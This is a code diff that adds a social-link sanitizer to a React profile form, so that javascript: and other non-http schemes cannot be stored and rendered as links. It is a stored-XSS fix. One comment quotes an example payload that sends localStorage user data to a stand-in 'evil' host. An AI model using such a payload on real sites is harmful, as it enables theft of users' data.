@@ -35,6 +35,35 @@ const SOCIAL_PLATFORMS = [
   { key: 'email',     label: 'Public Email',placeholder: 'hello@you.com',                   type: 'email' },
 ];
 
+// ─── Social link sanitizer ───────────────────────────────────────────────────
+// social_links are rendered as href on the public profile/service pages, so an
+// unvalidated value like `javascript:fetch('//evil/?c='+localStorage.user)` is
+// stored XSS. Never persist a non-http(s) scheme. Keep only: empty (cleared),
+// a valid email (email field), or an http(s) URL. Bare domains are normalised
+// to https:// to match the "full URL" UX the placeholders imply.
+const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+const sanitizeSocialLinks = (links = {}) => {
+  const out = {};
+  for (const { key, type } of SOCIAL_PLATFORMS) {
+    const raw = String(links[key] ?? '').trim();
+    if (!raw) { out[key] = ''; continue; }
+    if (type === 'email') {
+      out[key] = EMAIL_RE.test(raw) ? raw : '';
+      continue;
+    }
+    if (/^https?:\/\//i.test(raw)) {
+      out[key] = raw;
+    } else if (/^[a-z][a-z0-9+.-]*:/i.test(raw)) {
+      // Some other scheme (javascript:, data:, mailto:, …) — reject outright.
+      out[key] = '';
+    } else {
+      // Bare domain / path → assume https.
+      out[key] = `https://${raw}`;
+    }
+  }
+  return out;
+};
+
 // ─── Color Swatch ────────────────────────────────────────────────────────────
 const Swatch = ({ color, selected, onClick }) => (
   <button
@@ -220,7 +249,10 @@ const ProfileSetup = () => {
     e.preventDefault();
     setLoading(true);
     try {
-      const { data } = await updateProfile(form);
+      // Strip any non-http(s) scheme (javascript:, data:, …) before persisting —
+      // these values render as href on public pages and would be stored XSS.
+      const payload = { ...form, social_links: sanitizeSocialLinks(form.social_links) };
+      const { data } = await updateProfile(payload);
       updateUser({ ...data, token: user.token, refresh_token: user.refresh_token });
       toast.success("Profile saved!");
       setDirty(false);
